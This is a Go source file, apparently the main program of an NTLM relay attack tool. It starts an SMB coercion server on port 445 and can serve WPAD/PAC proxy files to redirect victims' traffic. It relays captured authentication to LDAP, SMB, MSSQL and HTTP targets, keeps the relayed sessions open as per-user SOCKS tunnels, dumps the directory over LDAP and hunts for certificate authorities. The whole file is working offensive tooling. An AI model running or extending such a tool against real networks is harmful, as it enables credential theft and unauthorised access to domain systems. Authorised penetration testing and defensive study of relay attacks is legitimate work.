package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"io"
	"strconv"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

const (
	Red          = "\033[31m"
	Green        = "\033[32m"
	Yellow       = "\033[33m"
	Blue         = "\033[34m"
	Magenta      = "\033[35m"
	Cyan         = "\033[36m"
	Grey 		 = "\033[90m"
	Reset  		 = "\033[0m"
)

var (
	// user options
	targets      	[]string	
	targetFile 		string
	targetAddr      string
	debug    		bool
	verbose    		bool
	findCA	   		bool
	dump       		bool
    noIPv4 			bool
	noIPv6 			bool
	noSMB			bool
	smbServerName	string
	wpadHostname	string
	interfaceName	string
	httpPort		string
	socksAddr		string

	//http stuff
	v4Addr			string 
	v6Addr 			string
	httpListen 		string

	//wpad stuff
	interfaceIPv4	string
	interfaceIPv6	string

	//relay stuff
	clientStates 	sync.Map // map[string]*clientState; clientKey -> state
	ipToUser 		sync.Map // map[string]struct{user string; timestamp time.Time}
	userTunMu     	sync.Mutex
	sessionsMu 		sync.RWMutex
	userTunnels = 	map[string]string{} // "DOMAIN\user" -> "127.0.0.1:PORT"	
	sessions = 		map[string]map[int]map[string]*Session{}

	// ldap stuff
	baseDN	   		string
	configDN   		string

	//socks stuff
    socksIP       	string
    socksBasePort 	int
	nextSOCKSPort int32 = 1080

	logFile 		string
)

// checks user provided targets
func validateTarget(target string) error {
    validSchemes := []string{"http://", "https://", "ldap://", "ldaps://", "smb://", "mssql://"}
    for _, scheme := range validSchemes {
        if strings.HasPrefix(target, scheme) {
            return nil
        }
    }
    return fmt.Errorf("target must include scheme (http://, https://, ldap://, ldaps://, smb://, mssql://)")
}

// sends keep alives for each tunnel
// need to separate keep alive timers per protocol
func sessionJanitor() {
    t := time.NewTicker(30 * time.Second)
    for range t.C {
        sessionsMu.RLock()
        var toDelete []*Session
        for _, byPort := range sessions {
            for _, byUser := range byPort {
                for _, sess := range byUser {
                    if sess.InUse.Load() {
                        continue
                    }
                    if sess.Dead.Load() {
                        toDelete = append(toDelete, sess)
                        continue
                    }
                    if err := sess.Client.KeepAlive(); err != nil {
                        sess.Dead.Store(true)
                        _ = sess.Client.Kill()
                        toDelete = append(toDelete, sess)
                    }
                }
            }
        }
        sessionsMu.RUnlock()

        if len(toDelete) > 0 {
            sessionsMu.Lock()
            for _, sess := range toDelete {
                byPort, ok := sessions[sess.Target]
                if !ok {
                    continue
                }
                byUser, ok := byPort[sess.Port]
                if !ok {
                    continue
                }
                delete(byUser, sess.User)
                if len(byUser) == 0 {
                    delete(byPort, sess.Port)
                }
                if len(byPort) == 0 {
                    delete(sessions, sess.Target)
                }
            }
            sessionsMu.Unlock()
        }

        // Clean up stale ipToUser entries
        ipToUser.Range(func(key, value interface{}) bool {
            userInfo := value.(struct{ user string; timestamp time.Time })
            if time.Since(userInfo.timestamp) > 5*time.Minute {
                ipToUser.Delete(key)
            }
            return true
        })
    }
}

// simple interactive menu
func interactiveMenu() {
	sc := bufio.NewScanner(os.Stdin)
	first := true
	for {
		if !first {
			fmt.Print("> ")
		}
		first = false
		if !sc.Scan() {
			return
		}
		input := strings.TrimSpace(sc.Text())
		args := strings.Fields(input)
		command := ""
		if len(args) > 0 {
			command = args[0]
			args = args[1:]
		}
		switch command {
		case "socks":
			dumpSocks()
		case "add_target":
			if len(args) == 0 {
				fmt.Println("usage: add_target <scheme://host>")
				continue
			}
			newTarget := args[0]
			if err := validateTarget(newTarget); err != nil {
				fmt.Printf("[!] %v\n", err)
				continue
			}
			targets = append(targets, newTarget)
			log.Printf("[+] Added target: %s (%d total)", newTarget, len(targets))
		case "help":
			fmt.Println("try socks, add_target, or quit")
		case "quit", "exit":
			os.Exit(0)
		default:
			fmt.Println("unknown command (try 'help' for options)")
		}
	}
}

// logging
func initLogging() {
    var w io.Writer = os.Stdout
    if logFile != "" {
        f, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        if err != nil {
            log.Fatalf("log file open failed: %v", err)
        }
        w = io.MultiWriter(os.Stdout, f)
    }

    log.SetFlags(0)
    log.SetOutput(w)

    if logFile != "" {
        log.Printf("[+] Log file enabled: %s", logFile)
    }
}

func main() {
    flag.StringVar(&targetFile, "targetfile", "", "file with list of targets (one per line)")
    flag.StringVar(&targetAddr, "target", "", "target server (http/https/ldap/ldaps)")
	flag.StringVar(&httpPort, "http-port", ":80", "HTTP server port")
    flag.StringVar(&socksAddr, "socks-address", "127.0.0.1:1080", "socks listen address (e.g., 127.0.0.1:1080 or 0.0.0.0:1080)")
    flag.StringVar(&interfaceName, "interface", "", "Interface to use")
    flag.StringVar(&wpadHostname, "wpad", "", "Hostname for WPAD (e.g., attacker.corp.local)")
	flag.StringVar(&logFile, "log", "", "write logs to file")
	flag.BoolVar(&findCA, "find-ca", false, "will query for cert authorities to add to the target list after successful ldap relays")
    flag.BoolVar(&dump, "dump", false, "sends ObjectClass=* query to DC and dumps into a json file")
	flag.BoolVar(&noIPv4, "no-ipv4", false, "disable default IPv4 listening (0.0.0.0)")
    flag.BoolVar(&noIPv6, "no-ipv6", false, "disable default IPv6 listening ([::])")
    flag.BoolVar(&noSMB, "no-smb", false, "disable SMB coercion server")
    flag.StringVar(&smbServerName, "smb-name", "", "SMB NTLM challenge identity (e.g., CORP\\file-srv.corp.local)")
    flag.BoolVar(&debug, "debug", false, "debug logs")
    flag.BoolVar(&verbose, "verbose", false, "verbose logs")
    flag.Parse()

    log.SetFlags(0)
    log.SetOutput(os.Stdout)

	initLogging()

	// validate provided targets
	if targetFile == "" && targetAddr == "" {
		log.Fatal("[!] Error: must specify either -target or -targetfile")
	}

	if targetFile != "" && targetAddr != "" {
		log.Fatal("[!] Error: cannot specify both -target and -targetfile")
	}

	if targetAddr != "" {
		if err := validateTarget(targetAddr); err != nil {
			log.Fatalf("[!] Error: %v", err)
		}
		targets = []string{targetAddr}
	}

	if targetFile != "" {
		data, err := os.ReadFile(targetFile)
		if err != nil {
			log.Fatalf("[!] Error reading target file: %v", err)
		}
		
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if err := validateTarget(line); err != nil {
				log.Fatalf("[!] Error with target %s: %v", line, err)
			}
        	targets = append(targets, line)
		}
	}

    // validate socks-address
    host, port, err := net.SplitHostPort(socksAddr)
    if err != nil {
        log.Fatalf("[!] Invalid socks address %s: %v", socksAddr, err)
    }
    if net.ParseIP(host) == nil {
        log.Fatalf("[!] Invalid socks IP address: %s", host)
    }
    basePort, err := strconv.Atoi(port)
    if err != nil {
        log.Fatalf("[!] Invalid socks port %s: %v", port, err)
    }
    socksIP = host
    socksBasePort = basePort
    atomic.StoreInt32(&nextSOCKSPort, 0)

    // parse httpPort
	if strings.HasPrefix(httpPort, ":") {
		httpListen = httpPort
	} else {
		httpListen = ":" + httpPort
	}
		
	mux := http.NewServeMux()
	mux.HandleFunc("/", httpHandler)

	// wrapper handler to intercept CONNECT before ServeMux
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodConnect {
			httpHandler(w, r)  // Send CONNECT directly to httpHandler
			return
		}
		mux.ServeHTTP(w, r)  // Everything else through ServeMux
	})

	// set listening addresses, ensure at least one address is specified
	if !noIPv4 {
		v4Addr = "0.0.0.0" + httpListen
	}
	if !noIPv6 {
		v6Addr = "[::]" + httpListen
	}

    if v4Addr == "" && v6Addr == "" {
        log.Fatalf("[!] Error: no listening addresses specified")
    }

	// Get IPs from interface if specified
	if interfaceName != "" {
		iface, err := net.InterfaceByName(interfaceName)
		if err != nil {
			log.Fatalf("[!] Interface %s not found: %v", interfaceName, err)
		}
		addrs, err := iface.Addrs()
		if err != nil {
			log.Fatalf("[!] Failed to get addresses for %s: %v", interfaceName, err)
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					interfaceIPv4 = ipnet.IP.String()
				} else if ipnet.IP.To16() != nil {
					// Accept both link-local and global unicast IPv6
					interfaceIPv6 = ipnet.IP.String()
				}
			}
		}
		if interfaceIPv4 != "" {
			log.Printf("[*] Detected IPv4 from %s: %s", interfaceName, interfaceIPv4)
		}
		if interfaceIPv6 != "" {
			log.Printf("[*] Detected IPv6 from %s: %s", interfaceName, interfaceIPv6)
		}
		if interfaceIPv4 == "" && interfaceIPv6 == "" {
			log.Fatalf("[!] No usable IP address found on interface %s", interfaceName)
		}
	}

	// start smb server
	if !noSMB {
		go func() {
			if err := StartSMBCoercion(":445"); err != nil {
				log.Fatalf("SMB server error: %v", err)
			}
		}()
	}

	//wpad stuff
    // Register WPAD routes if hostname and at least one IP are available
    if wpadHostname != "" && (interfaceIPv4 != "" || interfaceIPv6 != "") {
        mux.HandleFunc("/wpad.dat", func(w http.ResponseWriter, r *http.Request) {
            serveWPAD(w, r, interfaceIPv4, interfaceIPv6, wpadHostname)
        })
        mux.HandleFunc("/proxy.pac", func(w http.ResponseWriter, r *http.Request) {
            serveWPAD(w, r, interfaceIPv4, interfaceIPv6, wpadHostname)
        })
        log.Printf("[+] WPAD enabled: hostname=%s, ipv4=%s, ipv6=%s", wpadHostname, interfaceIPv4, interfaceIPv6)
    } else if wpadHostname != "" || interfaceName != "" {
        log.Printf("[!] Warning: WPAD requires both -wpad and -interface flags")
    }

    // start http listeners
    if v4Addr != "" {
        ln4, err := net.Listen("tcp4", v4Addr)
        if err != nil {
            log.Fatalf("[!] Listen v4 %s failed: %v", v4Addr, err)
        }
        go func() {
            if err := http.Serve(ln4, handler); err != nil {
                log.Printf("[!] HTTP v4 server stopped: %v", err)
            }
        }()
        log.Printf("[+] Listening on %s", v4Addr)
    }
    if v6Addr != "" {
        ln6, err := net.Listen("tcp6", v6Addr)
        if err != nil {
            log.Fatalf("[!] Listen v6 %s failed: %v", v6Addr, err)
        }
        go func() {
            if err := http.Serve(ln6, handler); err != nil {
                log.Printf("[!] HTTP v6 server stopped: %v", err)
            }
        }()
        log.Printf("[+] Listening v6 %s", v6Addr)
    }

    // print # of targets
    log.Printf("[+] Relaying to %d target(s)", len(targets))

    go sessionJanitor()
	go interactiveMenu()

    select {}
}